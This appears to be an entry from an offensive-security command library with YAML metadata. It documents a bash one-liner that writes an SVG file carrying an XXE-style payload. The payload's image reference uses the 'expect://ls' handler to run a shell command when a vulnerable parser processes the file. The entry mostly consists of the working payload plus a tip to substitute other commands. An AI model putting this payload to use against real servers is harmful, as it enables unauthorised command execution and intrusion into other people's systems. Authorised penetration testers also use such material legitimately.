---
id: acbfbff4-d644-489d-a03e-e3a2b9263f5e
name: generate-svg-xxe-directory-listing
type: command
executor: bash
data: >-
  echo '<svg xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1"
  height="200">
      <image xlink:href="expect://ls" width="200" height="200"></image>
  </svg>' > payload.svg
output: null
created_at: '2023-04-06T03:56:44.558781+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - xxe
  - svg
  - generation
verified: true
validated: true
---

# generate-svg-xxe-directory-listing

## Command

```bash
echo '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls" width="200" height="200"></image>
</svg>' > payload.svg
```

## Description

This command generates an SVG file containing an XXE payload that attempts to list the current directory using the expect protocol handler when parsed by a vulnerable client or server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| > payload.svg | Output file name for the generated SVG | Yes |

## Examples

### Basic Usage

```bash
echo '<svg ... >' > payload.svg
```

### Advanced Usage

Modify the xlink:href to other commands like 'expect://pwd' for current directory path.

## Expected Output

Creates payload.svg file. No stdout; verify with `ls -la payload.svg` showing the file exists with XXE content.

## Related

- [[procedures/XXE-Injection-via-SVG-Image]]
- [[codes/SVG-XXE-List-Directory-Using-Expect]]
